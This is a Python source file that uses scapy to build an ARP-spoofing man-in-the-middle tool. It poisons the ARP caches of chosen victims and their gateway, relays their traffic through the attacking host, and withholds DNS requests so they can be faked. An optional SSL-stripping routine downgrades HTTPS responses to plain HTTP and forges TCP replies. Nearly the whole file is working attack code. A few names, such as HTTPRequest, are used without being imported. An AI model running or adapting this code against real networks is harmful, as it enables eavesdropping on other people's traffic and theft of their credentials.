from threading import Thread
from time import sleep
from scapy.all import (
    ARP,
    Ether,
    IP,
    ICMP,
    sendp,
    send,
    sr,
    TCP,
    DNS,
    load_layer
    )
from entities import Host, Interface
from util import Sniffer
import http
from http.client import HTTPSConnection
import re

class ARPAttack:
    USE_SSL_STRIPPING = False

    def __init__(self,
            interface: Interface,
            gateway: Host = None,
            victims: list[Host] = [],
            interval: int = 10):

        if gateway is None:
            raise ValueError('There is no gateway selected')
        if len(victims) == 0:
            raise ValueError('There are no victims selected')

        self.interface = interface
        self.gateway = gateway
        self.victims = victims
        self.interval = interval
        self.active = False

    def start(self):
        self.active = True
        # We don't need to keep a reference to this thread because the thread will stop automatically
        Thread(target = self.poison_cache).start()
        self.sniffing_thread = Sniffer(self.interface, self.forward_packet)
        self.sniffing_thread.start()

    def stop(self):
        self.sniffing_thread.join()
        self.repair_cache()
        self.active = False

    def forward_packet(self, packet):
        # We cannot forward packets if we cannot see to where it is supposed to go
        if not (packet.haslayer(Ether) and packet.haslayer(IP)):
            return

        # Don't look at packets not addressed to us
        if packet.haslayer(Ether) and packet[Ether].dst != self.interface.mac_address.lower():
            return

        # We're not forwarding packets of our own
        if packet[IP].src == self.interface.ip_address:
            return

        # We don't forward DNS requests because we need to fake them
        if packet.haslayer(DNS):
            return

        if self.USE_SSL_STRIPPING:
            if packet.haslayer(HTTPRequest):
                self.perform_ssl_strip(packet)
                return

            # Don't forward tcp connections on port 80 (http)
            if packet.haslayer(TCP) and packet[TCP].dport == 80:
                # respond if only the SYN flag is set
                flags = packet[TCP].flags
                if 'S' in flags:
                    response = IP() / TCP(flags='SA')
                    response[IP].src = packet[IP].dst
                    response[IP].dst = packet[IP].src
                    response[TCP].sport = packet[TCP].dport
                    response[TCP].dport = packet[TCP].sport
                    response[TCP].ack = packet[TCP].seq + 1
                    response[TCP].seq = 0

                    send(response, verbose=0)
                    
                return

        for victim in self.victims:
            # victim -> gateway
            if packet[IP].src == victim.ip_address and packet[IP].dst != self.interface.ip_address:
                packet[Ether].dst = self.gateway.mac_address
                packet[Ether].src = self.interface.mac_address
                sendp(packet, verbose=0)
                return
            # gateway -> victim
            if packet[IP].dst == victim.ip_address:
                packet[Ether].dst = victim.mac_address
                packet[Ether].src = self.interface.mac_address
                sendp(packet, verbose=0)
                return
            
    def perform_ssl_strip(self, packet):
        http_layer = packet[HTTPRequest]
        status, headers, data = self.make_https_request(http_layer)
        # Convert list of tuples to a dictionary, replacing spaces with underscores
        headers = { header: value.replace('https', 'http') for header, value in headers }
        # Replace https with http
        data = data.replace('https', 'http')

        http_response = self.build_http_response(status, headers, data)

        segment_size = 1400
        response_parts = [http_response[i:i+segment_size] for i in range(0, len(http_response), segment_size)]


        bytes_read = packet[TCP].seq + len(packet[TCP].payload)
        bytes_sent = packet[TCP].ack

        for part in response_parts:
            reply = IP(flags=2) / TCP() / HTTP() / part
            reply[IP].src = packet[IP].dst
            reply[IP].dst = packet[IP].src
            reply[TCP].sport = packet[TCP].dport
            reply[TCP].dport = packet[TCP].sport
            reply[TCP].flags = "A"
            reply[TCP].ack = bytes_read
            reply[TCP].seq = bytes_sent

            bytes_sent += len(part)

            send(reply, verbose=0)

    def build_http_response(self, status, headers, data):
        response = f'HTTP/1.1 {status}\r\n'

        for header, value in headers.items():
            if header.lower() in ['content-length', 'content-encoding']:
                continue
            response += f'{header}: {value}\r\n'

        response += f'Content-Length: {len(data) + 4}\r\n'
        response += f'Content-Encoding: none\r\n'

        response += '\r\n'
        response += data
        response += '\r\n\r\n'

        return response

    def make_https_request(self, http_layer):
        host = http_layer.Host.decode('utf-8')
        method = http_layer.Method.decode('utf-8')
        path = http_layer.Path.decode('utf-8')

        connection = HTTPSConnection(host)
        connection.request(method, path, headers={'Accept-Charset': 'utf-8'})
        
        response = connection.getresponse()
        data = response.read().decode('utf-8')
        headers = response.getheaders()
        status = response.status

        return status, headers, data

    def ping(self):
        for victim in self.victims:
            ping = IP() / ICMP()
            ping[IP].src = victim.ip_address
            ping[IP].dst = self.gateway.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

            ping = IP() / ICMP()
            ping[IP].src = self.gateway.ip_address
            ping[IP].dst = victim.ip_address
            sr(ping, iface=self.interface.name, timeout=1, verbose=0)

    def poison_cache(self):
        # The victims and gateway need to know of each others existence before
        # the attack can be performed (or so it seems, at least)
        self.ping()

        while True:
            if not self.active:
                return

            for victim in self.victims:
                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = self.gateway.mac_address
                packet[ARP].psrc = victim.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = self.gateway.ip_address
                packet[ARP].hwdst = self.gateway.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)

                packet = Ether() / ARP()
                packet[Ether].src = self.interface.mac_address
                packet[Ether].dst = victim.mac_address
                packet[ARP].psrc = self.gateway.ip_address
                packet[ARP].hwsrc = self.interface.mac_address
                packet[ARP].pdst = victim.ip_address
                packet[ARP].hwdst = victim.mac_address
                packet[ARP].op = 2
                sendp(packet, iface=self.interface.name, verbose=0)
            sleep(self.interval)

    def repair_cache(self):
        for victim in self.victims:
            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = self.gateway.mac_address
            packet[ARP].psrc = victim.ip_address
            packet[ARP].hwsrc = victim.mac_address
            packet[ARP].pdst = self.gateway.ip_address
            packet[ARP].hwdst = self.gateway.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)

            packet = Ether() / ARP()
            packet[Ether].src = self.interface.mac_address
            packet[Ether].dst = victim.mac_address
            packet[ARP].psrc = self.gateway.ip_address
            packet[ARP].hwsrc = self.gateway.mac_address
            packet[ARP].pdst = victim.ip_address
            packet[ARP].hwdst = victim.mac_address
            packet[ARP].op = 2
            sendp(packet, iface=self.interface.name, verbose=0)
